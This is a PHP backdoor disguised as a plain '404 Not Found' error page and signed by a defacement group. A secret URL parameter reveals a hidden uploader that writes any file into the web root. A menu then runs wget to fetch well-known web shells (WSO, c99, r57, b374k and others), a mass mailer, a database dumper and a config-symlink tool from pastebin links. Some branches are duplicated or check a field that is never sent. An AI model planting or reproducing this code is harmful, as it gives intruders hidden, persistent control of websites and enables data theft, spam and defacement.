<html>
<head>
<title>404 Not Found</title>
</head>
<body>
<h1>Not Found</h1>
<p>
The requested document was not found on this server.
</p>
<hr>
</body>
</html>
<?php
if (isset($_GET['univers-id'])) {

    if($_GET['univers-id'] == 'gans') {
?>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
        <style>
            body{
                background-image: url('https://universblogdotnet.files.wordpress.com/2018/04/img-20171108-wa0063.jpg');
                background-size: cover;
                background-attachment: fixed;
                background-repeat: no-repeat;
                background-position: center;
                text-align:center; 
                padding-top: 30px;
            } 
            h1 { 
                display: none; 
            } 
            p { 
                display: none;
            }
            hr {
                display: none;
            }
            h2 {
                font-size:45px;
                color:white;
                text-align:center;
                text-shadow: -0.08em 0 red, 0.08em 0 cyan;
                font-family:Righteous;
                letter-spacing: 0.1em;
            }
            h6 {
                font-size:25px;
                color:white;
                text-align:center;
                text-shadow: -0.08em 0 5px red, 0.08em 0 5px cyan;
                font-family:Rancho;
            }
            form{
                max-width: 350px;
                margin: 0 auto;
                margin-bottom: 10px;
            }
        </style>
        <div class="container">
        <h2>Hidden Uploder</h2>
        <h6>-=[ R.I.P - Jelangkung Squad- ]=-</h6>
        <form method='post' enctype='multipart/form-data' class='form'>
            <div class="input-group" style="max-width: 350px;">
               <input type='file' name='file' class="form-control">
              <span class="input-group-btn">
               <input class="btn btn-primary" type='submit' name='upload' value='Upload!'>
              </span>
            </div><!-- /input-group -->
        </form>
<?php
        $root = $_SERVER['DOCUMENT_ROOT'];
        if(isset($_POST['upload'])) {
        	if(is_writable($root)) {
                $files = $_FILES['file']['name'];
                $dest = $root.'/'.$files;
        		if(@copy($_FILES['file']['tmp_name'], $dest)) {
        			$web = "http://".$_SERVER['HTTP_HOST']."/";
        			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
        		} else {
        			echo "gagal upload di document root.";
        		}
        	} else {
        		if(@copy($_FILES['file']['tmp_name'], $files)) {
        			echo "sukses upload <b>$files</b> di folder ini";
        		} else {
        			echo "gagal upload";
        		}
        	}
        }
?>
    	<table align=center>
            <td>
                <form method='post'>
                    <div class="input-group" style="max-width: 350px;">
                        <select name='lucknut' style="padding:4px 10px;" class="form-control">
                        <option selected'>Summoner Tools</option>
                        <option value='zoneh'>ZONE-H</option>
                        <option value='defid'>DEFACER ID</option>
                        <option value='symconf'>SYMLINK CONFIG</option>
                        <option value='mails'>MAILER</option>
                        <option value='dump'>DUMP DB</option>
                        <option value='wso_shell'>WSO SHELL</option>
                        <option value='idx_shell'>IDX SHELL</option>
                        <option value='c99_shell'>C99 SHELL</option>
                        <option value='r57_shell'>r57 SHELL</option>
                        <option value='galerz_shell'>GALERZ SHELL</option>
                        <option value='t9_shell'>T9 SHELL</option>
                        <option value='az_shell'>AZZAT SHELL</option>
                        <option value='krdp'>KRDP SHELL</option>
                        <option value='b374k'>B374K Shell</option>
                        <option value='sadrazam'>Sadrazam Shell</option>
                        <option value='blackhat'>BlackHat Shell</option>
                        <option value='noname'>Noname Shell</option>
                    </select>
                        <span class="input-group-btn">
                           <input type='submit' class='btn btn-success' name='enter' value='Summon!' class='summon'>
                        </span>
                    </div><!-- /input-group -->
                </form>
            </td>
        </table>
<?php
        if(isset($_POST['enter']))   {  
            if ($_POST['lucknut'] == 'wso_shell')  {  
                $exec=exec('wget http://pastebin.com/raw.php?i=Tpm5E10g -O wsoshell.php');
                if(file_exists('./wsoshell.php')){
                    echo '<center><a href=./wsoshell.php target="_blank"> wso.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 'az_shell') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=0vy06H1x -O azshell.php');
                if(file_exists('./azshell.php')){
                    echo '<center><a href=./azshell.php target="_blank"> azshell.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 't9_shell') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=zMdY8xDn -O t9shell.php');
                if(file_exists('./t9shell.php')){
                    echo '<center><a href=./t9shell.php target="_blank"> t9shell.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 'galerz_shell') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=S9tzBgg3 -O galerzshell.php');
                if(file_exists('./galerzshell.php')){
                    echo '<center><a href=./galerzshell.php target="_blank"> galerzshell.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 'r57_shell') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=S9tzBgg3 -O r57shell.php');
                if(file_exists('./r57shell.php')){
                    echo '<center><a href=./r57shell.php target="_blank"> r57shell.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 'c99_shell') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=Ms0ptnpH -O c99shell.php');
                if(file_exists('./c99shell.php')){
                    echo '<center><a href=./c99shell.php target="_blank"> c99shell.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 'idx_shell') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=nC6pWh5a -O idxshell.php');
                if(file_exists('./idxshell.php')){
                    echo '<center><a href=./idxshell.php target="_blank"> idxshell.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }else if ($_POST['lucknut'] == 'zoneh') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=B1Dk3P8R -O zoneh.php');
                if(file_exists('./zoneh.php')){
                    echo '<center><a href=./zoneh.php target="_blank"> zoneh.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 'krdp') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=weQnAGad -O krdp.php');
                if(file_exists('./krdp.php')){
                    echo '<center><a href=./krdp.php target="_blank"> krdp.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 'defid') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=1b9bcZdH -O defid.php');
                if(file_exists('./defid.php')){
                    echo '<center><a href=./defid.php target="_blank"> defid.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 'krdp') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=weQnAGad -O krdp.php');
                if(file_exists('./krdp.php')){
                    echo '<center><a href=./krdp.php target="_blank"> krdp.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 'symconf') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=KyLM7awc -O symconf.php');
                if(file_exists('./symconf.php')){
                    echo '<center><a href=./symconf.php target="_blank"> symconf.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 'mails') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=6rTJ1ubw -O mail.php');
                if(file_exists('./mail.php')){
                    echo '<center><a href=./mail.php target="_blank"> mail.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }
            }elseif ($_POST['lucknut'] == 'dump') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=ZG1A2s4u -O dump.php');
                if(file_exists('./dump.php')){
                    echo '<center><a href=./dump.php target="_blank"> dump.php </a> upload sukses !</center>';
                } else {
                    echo '<center>gagal upload !</center>';
                }        
             }elseif($_POST['shell'] == 'b374k') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=cR71LiMp -O b374k.php');
                if(file_exists('./b374k.php')){
                    echo '<center><a href=./b374k.php target="_blank"> b374k.php </a> upload sukses !</center>';
                } else {
                    echo '<center>Failed!</center>';
                }
            }elseif($_POST['shell'] == 'sadrazam') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=xjKrnnBD -O sadrazam.php');
                if(file_exists('./sadrazam.php')){
                    echo '<center><a href=./sadrazam.php target="_blank"> sadrazam.php </a> upload sukses !</center>';
                } else {
                    echo '<center>Failed!</center>';
                }
            }elseif($_POST['shell'] == 'blackhat') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=3L2ESWeu -O bh.php');
                if(file_exists('./bh.php')){
                    echo '<center><a href=./bh.php target="_blank"> bh.php </a> upload sukses !</center>';
                } else {
                    echo '<center>Failed!</center>';
                }
            }elseif($_POST['shell'] == 'noname') {
        		$exec=exec('wget http://pastebin.com/raw.php?i=BRCmf02c -O noname.php');
                if(file_exists('./noname.php')){
                    echo '<center><a href=./noname.php target="_blank"> noname.php </a> upload sukses !</center>';
                } else {
                    echo '<center>Failed!</center>';
                }        
            }
        }
    }
}
?>